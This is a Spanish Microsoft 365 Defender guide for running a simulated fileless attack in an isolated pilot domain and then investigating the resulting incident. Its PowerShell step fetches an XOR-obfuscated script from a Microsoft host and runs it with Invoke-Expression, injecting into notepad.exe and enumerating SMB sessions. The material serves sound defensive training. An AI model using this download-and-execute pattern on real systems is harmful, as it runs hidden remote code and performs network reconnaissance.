---
title: Ejecución de una simulación de ataque en un entorno piloto de Microsoft 365 Defender
description: Ejecute simulaciones de ataque para Microsoft 365 Defender para ver cómo se presentan las alertas y los incidentes, se obtienen conclusiones y las amenazas se corrigen rápidamente.
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.service: microsoft-365-security
ms.subservice: m365d
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- m365-security
- m365solution-scenario
- m365solution-pilotmtpproject
- zerotrust-solution
- highpri
- tier1
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.openlocfilehash: 15645d8058ef9508f1ed6bf08617ca3c9c5b3e9e
ms.sourcegitcommit: 12af9e8e3a6eaa090fda9e98ccb831dff65863a4
ms.translationtype: MT
ms.contentlocale: es-ES
ms.lasthandoff: 09/27/2022
ms.locfileid: "68059424"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>Ejecución de una simulación de ataque en un entorno piloto de Microsoft 365 Defender


Este artículo es el [paso 1 del 2](eval-defender-investigate-respond.md) en el proceso de realizar una investigación y respuesta de un incidente en Microsoft 365 Defender mediante un entorno piloto. Para obtener más información sobre este proceso, consulte el artículo [de información general](eval-defender-investigate-respond.md) .

Después de preparar el [entorno piloto](eval-defender-investigate-respond.md), es el momento de probar la respuesta a incidentes de Microsoft 365 Defender y las funcionalidades automatizadas de investigación y corrección mediante la creación de un incidente con un ataque simulado y el uso del portal de Microsoft 365 Defender para investigar y responder.

Un incidente en Microsoft 365 Defender es una colección de alertas correlacionadas y datos asociados que conforman la historia de un ataque.

Los servicios y aplicaciones de Microsoft 365 crean alertas cuando detectan un evento o actividad sospechosos o malintencionados. Las alertas individuales proporcionan pistas valiosas sobre un ataque completado o en curso. Sin embargo, los ataques suelen emplear varias técnicas en distintos tipos de entidades, como dispositivos, usuarios y buzones de entrada. El resultado son varias alertas para varias entidades del espacio empresarial.

>[!Note]
>Si no está familiarizado con el análisis de seguridad y la respuesta a incidentes, consulte el [tutorial Responder a su primer incidente](first-incident-overview.md) para obtener una visita guiada de un proceso típico de análisis, corrección y revisión posterior al incidente.
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>Simulación de ataques con el portal de Microsoft 365 Defender

El portal de Microsoft 365 Defender tiene funcionalidades integradas para crear ataques simulados en el entorno piloto:

- Entrenamiento de simulación de ataque para Microsoft 365 Defender para Office 365 en [https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator).
  
  En el portal de Microsoft 365 Defender, seleccione **Email & > Entrenamiento de simulación de ataque de colaboración**.

- Los tutoriales de ataque & simulaciones de Microsoft 365 Defender para punto de conexión en [https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations).

  En el <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">portal de Microsoft 365 Defender</a>, seleccione Puntos de **conexión > Tutoriales & simulaciones**.

### <a name="defender-for-office-365-attack-simulation-training"></a>Defender para Office 365 Entrenamiento de simulación de ataque

Defender para Office 365 con Microsoft 365 E5 o Microsoft Defender para Office 365 Plan 2 incluye entrenamiento de simulación de ataques para ataques de phishing. Los pasos básicos son:

1. Creación de una simulación

   Para obtener instrucciones paso a paso sobre cómo crear e iniciar una nueva simulación, consulte [Simular un ataque de phishing](/microsoft-365/security/office-365-security/attack-simulation-training).

2. Creación de una carga

   Para obtener instrucciones paso a paso sobre cómo crear una carga para su uso dentro de una simulación, consulte [Creación de una carga personalizada para el entrenamiento de simulación de ataques](/microsoft-365/security/office-365-security/attack-simulation-training-payloads).

3. Obtención de información

   Para obtener instrucciones paso a paso sobre cómo obtener información con los informes, consulte [Obtención de información a través del entrenamiento de simulación de ataques](/microsoft-365/security/office-365-security/attack-simulation-training-insights).

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

Para obtener más información, vea [Simulaciones](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations).

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Tutoriales de ataques de Defender for Endpoint & simulaciones

Estas son las simulaciones de Defender para punto de conexión de Microsoft:

- El documento quita la puerta trasera
- Investigación automatizada (puerta trasera)

Hay simulaciones adicionales de orígenes de terceros. También hay un conjunto de tutoriales.

Para cada simulación o tutorial:

1. Descargue y lea el documento de tutorial correspondiente proporcionado.

2. Descargue el archivo de simulación. Puede optar por descargar el archivo o script en el dispositivo de prueba, pero no es obligatorio.

3. Ejecute el archivo o script de simulación en el dispositivo de prueba como se indica en el documento de tutorial.

 Para obtener más información, vea [Experiencia Microsoft Defender para punto de conexión a través de ataque simulado](/microsoft-365/security/defender-endpoint/attack-simulations).

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>Simulación de un ataque con un controlador de dominio aislado y un dispositivo cliente (opcional)

En este ejercicio opcional de respuesta a incidentes, simulará un ataque en un controlador de dominio de Servicios de dominio de Active Directory aislado (AD DS) y un dispositivo Windows mediante un script de PowerShell y, a continuación, investigará, corregirá y resolverá el incidente.

En primer lugar, debe agregar puntos de conexión al entorno piloto.

### <a name="add-pilot-environment-endpoints"></a>Adición de puntos de conexión de entorno piloto

En primer lugar, debe agregar un controlador de dominio de AD DS aislado y un dispositivo Windows al entorno piloto.

1. Compruebe que el inquilino del entorno piloto ha [habilitado Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. Compruebe que el controlador de dominio:

   - Ejecuta Windows Server 2008 R2 o una versión posterior.
   - Informa a [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) y ha habilitado la [administración remota](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - Tiene [habilitada la integración Microsoft Defender for Identity y Microsoft Defender for Cloud Apps](/cloud-app-security/mdi-integration).
   - Tiene un usuario de prueba creado en el dominio de prueba. No se necesitan permisos de nivel de administrador.

3. Compruebe que el dispositivo de prueba:

   - Ejecuta Windows 10 versión 1903 o una versión posterior.
   - Está unido al dominio del controlador de dominio de AD DS.
   - Tiene [Microsoft Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features) habilitado. Si tiene problemas para habilitar Microsoft Defender Antivirus, consulte este [tema de solución de problemas](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy).
   - Se [incorpora a Microsoft Defender para punto de conexión](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

Si usa grupos de inquilinos y dispositivos, cree un grupo de dispositivos dedicado para el dispositivo de prueba e insérelo en el nivel superior.

Una alternativa es hospedar el controlador de dominio de AD DS y probar el dispositivo como máquinas virtuales en los servicios de infraestructura de Microsoft Azure. Puede usar las instrucciones de la [fase 1 de la Guía del laboratorio de pruebas empresarial simulado](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet), pero omitir la creación de la máquina virtual APP1.

Este es el resultado.

:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="El entorno de evaluación mediante la Guía de laboratorio de pruebas empresariales simuladas" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

Simulará un ataque sofisticado que aprovecha técnicas avanzadas para ocultarse de la detección. El ataque enumera las sesiones abiertas del Bloque de mensajes del servidor (SMB) en los controladores de dominio y recupera las direcciones IP recientes de los dispositivos de los usuarios. Esta categoría de ataques normalmente no incluye archivos eliminados en el dispositivo de la víctima y se producen únicamente en la memoria. "Viven de la tierra" mediante el uso de herramientas administrativas y del sistema existentes e insertan su código en procesos del sistema para ocultar su ejecución. Este comportamiento les permite eludir la detección y persistir en el dispositivo.

En esta simulación, nuestro escenario de ejemplo comienza con un script de PowerShell. En el mundo real, es posible que se engañó a un usuario para que ejecute un script o que el script se ejecute desde una conexión remota a otro equipo desde un dispositivo infectado anteriormente, lo que indica que el atacante está intentando moverse lateralmente en la red. La detección de estos scripts puede ser difícil porque los administradores también suelen ejecutar scripts de forma remota para llevar a cabo diversas actividades administrativas.

:::image type="content" source="../../media/mtp/mtpdiydiagram.png" alt-text="Ataque de PowerShell sin archivos con inyección de procesos y ataque de reconocimiento smb" lightbox="../../media/mtp/mtpdiydiagram.png":::

Durante la simulación, el ataque inserta el código de shell en un proceso aparentemente inocente. El escenario requiere el uso de notepad.exe. Elegimos este proceso para la simulación, pero es más probable que los atacantes tengan como destino un proceso de sistema de ejecución prolongada, como svchost.exe. A continuación, el código de shell se pone en contacto con el servidor de comandos y control (C2) del atacante para recibir instrucciones sobre cómo continuar. El script intenta ejecutar consultas de reconocimiento en el controlador de dominio (DC). Reconocimiento permite a un atacante obtener información sobre la información de inicio de sesión de usuario reciente. Una vez que los atacantes tienen esta información, pueden moverse lateralmente en la red para llegar a una cuenta confidencial específica.

> [!IMPORTANT]
> Para obtener resultados óptimos, siga las instrucciones de simulación de ataques de la forma más cercana posible.

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>Ejecución de la simulación de ataque del controlador de dominio de AD DS aislada

Para ejecutar la simulación del escenario de ataque:

1. Asegúrese de que el entorno piloto incluye el controlador de dominio de AD DS aislado y el dispositivo Windows.

2. Inicie sesión en el dispositivo de prueba con la cuenta de usuario de prueba.

3. Abra una ventana Windows PowerShell en el dispositivo de prueba.

4. Copie el siguiente script de simulación:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > Si abre este artículo en un explorador web, es posible que encuentre problemas al copiar el texto completo sin perder determinados caracteres ni introducir saltos de línea adicionales. Si este es el caso, descargue este documento y ábralo en Adobe Reader.

5. Pegue y ejecute el script copiado en la ventana de PowerShell.

> [!NOTE]
> Si ejecuta PowerShell mediante el protocolo de escritorio remoto (RDP), use el comando Escribir texto del Portapapeles en el cliente RDP porque es posible que la tecla de acceso rápido **CTRL-V** o el método de clic y pegado con el botón derecho no funcionen. Las versiones recientes de PowerShell a veces tampoco aceptarán ese método, es posible que primero tenga que copiar en el Bloc de notas en la memoria, copiarlo en la máquina virtual y, a continuación, pegarlo en PowerShell.

Unos segundos después, se abrirá la aplicación Bloc de notas. Se insertará un código de ataque simulado en el Bloc de notas. Mantenga abierta la instancia del Bloc de notas generada automáticamente para experimentar el escenario completo.

El código de ataque simulado intentará comunicarse con una dirección IP externa (simulando el servidor C2) y, a continuación, intentará el reconocimiento con el controlador de dominio a través de SMB.

Verá este mensaje en la consola de PowerShell cuando se complete este script:

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

Para ver la característica De incidentes y respuestas automatizadas en acción, mantenga abierto el proceso de notepad.exe. Verá Incidentes automatizados y Respuesta detener el proceso del Bloc de notas.

### <a name="investigate-the-incident-for-the-simulated-attack"></a>Investigación del incidente del ataque simulado

> [!NOTE]
> Antes de guiarle por esta simulación, vea el siguiente vídeo para ver cómo la administración de incidentes le ayuda a agrupar las alertas relacionadas como parte del proceso de investigación, donde puede encontrarla en el portal y cómo puede ayudarle en las operaciones de seguridad:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

Al cambiar al punto de vista del analista de SOC, ahora puede empezar a investigar el ataque en el portal de Microsoft 365 Defender.

1. Abra el <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">portal de Microsoft 365 Defender</a>.

2. En el panel de navegación, seleccione **Incidentes & Alertas > Incidentes**.

3. El nuevo incidente para el ataque simulado aparecerá en la cola de incidentes.

   :::image type="content" source="../../media/mtp/fig2.png" alt-text="Ejemplo de la cola de incidentes" lightbox="../../media/mtp/fig2.png":::

#### <a name="investigate-the-attack-as-a-single-incident"></a>Investigación del ataque como un único incidente

Microsoft 365 Defender correlaciona el análisis y agrega todas las alertas e investigaciones relacionadas de diferentes productos en una entidad de incidente. Al hacerlo, Microsoft 365 Defender muestra una historia de ataque más amplia, lo que permite al analista de SOC comprender y responder a amenazas complejas.

Las alertas generadas durante esta simulación están asociadas a la misma amenaza y, como resultado, se agregan automáticamente como un único incidente.

Para ver el incidente:

1. Abra el <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">portal de Microsoft 365 Defender</a>.

2. En el panel de navegación, seleccione **Incidentes & Alertas > Incidentes**.

3. Seleccione el elemento más reciente haciendo clic en el círculo situado a la izquierda del nombre del incidente. Un panel lateral muestra información adicional sobre el incidente, incluidas todas las alertas relacionadas. Cada incidente tiene un nombre único que lo describe en función de los atributos de las alertas que incluye.

   Las alertas que se muestran en el panel se pueden filtrar en función de los recursos de servicio: Microsoft Defender for Identity, Microsoft Defender for Cloud Apps, Microsoft Defender para punto de conexión, Microsoft 365 Defender y Microsoft Defender para Office 365.

3. Seleccione **Abrir página de incidente** para obtener más información sobre el incidente.

   En la página **Incidente** , puede ver todas las alertas e información relacionadas con el incidente. La información incluye las entidades y los recursos implicados en la alerta, el origen de detección de las alertas (como Microsoft Defender for Identity o Microsoft Defender para punto de conexión) y el motivo por el que se vincularon entre sí. Al revisar la lista de alertas de incidentes se muestra la progresión del ataque. Desde esta vista, puede ver e investigar las alertas individuales.

   También puede hacer clic en **Administrar incidente** en el menú de la derecha para etiquetar el incidente, asignarlo a sí mismo y agregar comentarios.

#### <a name="review-generated-alerts"></a>Revisión de las alertas generadas

Echemos un vistazo a algunas de las alertas generadas durante el ataque simulado.

> [!NOTE]
> Solo se examinarán algunas de las alertas generadas durante el ataque simulado. Dependiendo de la versión de Windows y de los productos Microsoft 365 Defender que se ejecutan en el dispositivo de prueba, es posible que vea más alertas que aparecen en un orden ligeramente diferente.

:::image type="content" source="../../media/mtp/fig6.png" alt-text="Ejemplo de una alerta generada" lightbox="../../media/mtp/fig6.png":::

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>Alerta: Se ha observado una inyección de proceso sospechosa (origen: Microsoft Defender para punto de conexión)

Los atacantes avanzados usan métodos sofisticados y sigilosos para conservar la memoria y ocultarse de las herramientas de detección. Una técnica común es operar desde dentro de un proceso de sistema de confianza en lugar de un ejecutable malintencionado, lo que dificulta las herramientas de detección y las operaciones de seguridad para detectar el código malintencionado.

Para permitir que los analistas de SOC detecten estos ataques avanzados, los sensores de memoria profundos de Microsoft Defender para punto de conexión proporcionan a nuestro servicio en la nube una visibilidad sin precedentes de una variedad de técnicas de inyección de código entre procesos. En la ilustración siguiente se muestra cómo Defender para punto de conexión detectó y alertó sobre el intento de insertar código en <i>notepad.exe</i>.

:::image type="content" source="../../media/mtp/fig7.png" alt-text="Ejemplo de la alerta para la inserción de un código potencialmente malintencionado" lightbox="../../media/mtp/fig7.png":::

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>Alerta: comportamiento inesperado observado por una ejecución de proceso sin argumentos de línea de comandos (Origen: Microsoft Defender para punto de conexión)

Microsoft Defender para punto de conexión detecciones suelen tener como destino el atributo más común de una técnica de ataque. Este método garantiza la durabilidad y eleva el listón para que los atacantes cambien a tácticas más recientes.

Empleamos algoritmos de aprendizaje a gran escala para establecer el comportamiento normal de los procesos comunes dentro de una organización y en todo el mundo y observar cuándo estos procesos muestran comportamientos anómalos. Estos comportamientos anómalos suelen indicar que se introdujo código extraño y se ejecuta en un proceso de confianza.

En este escenario, el proceso <i>notepad.exe</i> está mostrando un comportamiento anómalo, lo que implica la comunicación con una ubicación externa. Este resultado es independiente del método específico que se usa para introducir y ejecutar el código malintencionado.

> [!NOTE]
> Dado que esta alerta se basa en modelos de aprendizaje automático que requieren procesamiento de back-end adicional, puede tardar algún tiempo antes de ver esta alerta en el portal.

Tenga en cuenta que los detalles de la alerta incluyen la dirección IP externa, un indicador que puede usar como pivote para expandir la investigación.

Seleccione la dirección IP en el árbol de proceso de alertas para ver la página de detalles de la dirección IP.

:::image type="content" source="../../media/mtp/fig8.png" alt-text="Ejemplo de comportamiento inesperado de un proceso que se ejecuta sin argumentos de línea de comandos" lightbox="../../media/mtp/fig8.png":::

En la ilustración siguiente se muestra la página de detalles de la dirección IP seleccionada (haciendo clic en dirección IP en el árbol proceso de alerta).

:::image type="content" source="../../media/mtp/fig9.png" alt-text="Ejemplo de la página de detalles de la dirección IP" lightbox="../../media/mtp/fig9.png":::

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>Alerta: Reconocimiento de direcciones IP y de usuario (SMB) (origen: Microsoft Defender for Identity)

La enumeración mediante el protocolo bloque de mensajes de servidor (SMB) permite a los atacantes obtener información de inicio de sesión de usuario reciente que les ayuda a moverse lateralmente a través de la red para acceder a una cuenta confidencial específica.

En esta detección, se desencadena una alerta cuando la enumeración de sesión SMB se ejecuta en un controlador de dominio.

:::image type="content" source="../../media/mtp/fig10.png" alt-text="Ejemplo de alerta de Microsoft Defender for Identity para el reconocimiento de direcciones IP y de usuario" lightbox="../../media/mtp/fig10.png":::

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>Revise la escala de tiempo del dispositivo con Microsoft Defender para punto de conexión

Después de explorar las distintas alertas de este incidente, vuelva a la página del incidente que investigó anteriormente. Seleccione la pestaña **Dispositivos** de la página incidente para revisar los dispositivos implicados en este incidente, tal y como informan Microsoft Defender para punto de conexión y Microsoft Defender for Identity.

Seleccione el nombre del dispositivo donde se realizó el ataque para abrir la página de entidad de ese dispositivo específico. En esa página, puede ver alertas que se desencadenaron y eventos relacionados.

Seleccione la pestaña **Escala de tiempo** para abrir la escala de tiempo del dispositivo y ver todos los eventos y comportamientos observados en el dispositivo en orden cronológico, intercalados con las alertas desencadenadas.

:::image type="content" source="../../media/mtp/fig11.png" alt-text="Ejemplo de escala de tiempo del dispositivo con comportamientos" lightbox="../../media/mtp/fig11.png":::

La expansión de algunos de los comportamientos más interesantes proporciona detalles útiles, como árboles de proceso.

Por ejemplo, desplácese hacia abajo hasta que encuentre el evento de alerta **Inyección de proceso sospechosa observada**. Seleccione el **powershell.exe insertado en notepad.exe** evento de proceso debajo de él para mostrar el árbol de proceso completo para este comportamiento en el gráfico **Entidades de eventos** del panel lateral. Use la barra de búsqueda para filtrar si es necesario.

:::image type="content" source="../../media/mtp/fig12.png" alt-text="Ejemplo del árbol de procesos para el comportamiento de creación de archivos de PowerShell seleccionado" lightbox="../../media/mtp/fig12.png":::

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>Revise la información del usuario con Microsoft Defender for Cloud Apps

En la página del incidente, seleccione la pestaña **Usuarios** para mostrar la lista de usuarios implicados en el ataque. La tabla contiene información adicional sobre cada usuario, incluida la puntuación de **prioridad de investigación** de cada usuario.

Seleccione el nombre de usuario para abrir la página de perfil del usuario donde se puede realizar una investigación adicional. [Obtenga más información sobre la investigación de usuarios de riesgo](/cloud-app-security/tutorial-ueba#identify).

:::image type="content" source="../../media/mtp/fig13.png" alt-text="Página de usuario de Defender for Cloud Apps" lightbox="../../media/mtp/fig13.png":::

#### <a name="automated-investigation-and-remediation"></a>Investigación y corrección automatizadas

> [!NOTE]
>Antes de guiarle por esta simulación, vea el siguiente vídeo para familiarizarse con lo que es la recuperación automática automatizada, dónde encontrarla en el portal y cómo puede ayudar en las operaciones de seguridad:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Vuelva al incidente en el portal de Microsoft 365 Defender. La pestaña **Investigaciones** de la página **Incidente** muestra las investigaciones automatizadas desencadenadas por Microsoft Defender for Identity y Microsoft Defender para punto de conexión. En la captura de pantalla siguiente se muestra solo la investigación automatizada desencadenada por Defender para punto de conexión. De forma predeterminada, Defender para punto de conexión corrige automáticamente los artefactos que se encuentran en la cola, lo que requiere una corrección.

:::image type="content" source="../../media/mtp/fig14.png" alt-text="Un ejemplo de las investigaciones automatizadas relacionadas con el incidente" lightbox="../../media/mtp/fig14.png":::

Seleccione la alerta que desencadenó una investigación para abrir la página **Detalles** de la investigación. Verá los detalles siguientes:

- Alertas que desencadenaron la investigación automatizada.
- Usuarios y dispositivos afectados. Si se encuentran indicadores en dispositivos adicionales, también se mostrarán estos dispositivos adicionales.
- Lista de pruebas. Las entidades encontradas y analizadas, como archivos, procesos, servicios, controladores y direcciones de red. Estas entidades se analizan para detectar posibles relaciones con la alerta y se califican como benignas o malintencionadas.
- Amenazas encontradas. Amenazas conocidas que se encuentran durante la investigación.

> [!NOTE]
> En función del tiempo, la investigación automatizada podría seguir ejecutándose. Espere unos minutos a que se complete el proceso antes de recopilar y analizar las pruebas y revisar los resultados. Actualice la página **Detalles de la investigación** para obtener los resultados más recientes.

:::image type="content" source="../../media/mtp/fig15.png" alt-text="Ejemplo de la página Detalles de la investigación" lightbox="../../media/mtp/fig15.png":::

Durante la investigación automatizada, Microsoft Defender para punto de conexión identificó el proceso de notepad.exe, que se inyectó como uno de los artefactos que requieren corrección. Defender for Endpoint detiene automáticamente la inserción de procesos sospechosos como parte de la corrección automatizada.

Puede ver <i>notepad.exe</i> desaparecer de la lista de procesos en ejecución en el dispositivo de prueba.

#### <a name="resolve-the-incident"></a>Resolución del incidente

Una vez completada la investigación y confirmada que se va a corregir, se resuelve el incidente.

En la página **Incidente** , seleccione **Administrar incidente**. Establezca el estado en **Resolver incidente** y seleccione **Alerta verdadera** para la clasificación y **Pruebas de seguridad** para la determinación.

:::image type="content" source="../../media/mtp/fig16.png" alt-text="Ejemplo de la página incidentes con el panel Administrar incidente abierto, donde puede hacer clic en el modificador para resolver el incidente." lightbox="../../media/mtp/fig16.png":::

Cuando se resuelve el incidente, resuelve todas las alertas asociadas en el portal de Microsoft 365 Defender y los portales relacionados.

Esto incluye simulaciones de ataque para el análisis de incidentes, la investigación automatizada y la resolución de incidentes.

## <a name="next-step"></a>Paso siguiente

[:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png" alt-text="Funcionalidades de respuesta a incidentes Microsoft 365 Defender" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png":::](eval-defender-investigate-respond-additional.md)

Paso 2 de 2: [Probar Microsoft 365 Defender capacidades de respuesta a incidentes](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>Navegación que puede necesitar

[Creación del entorno de evaluación de Microsoft 365 Defender](eval-create-eval-environment.md)
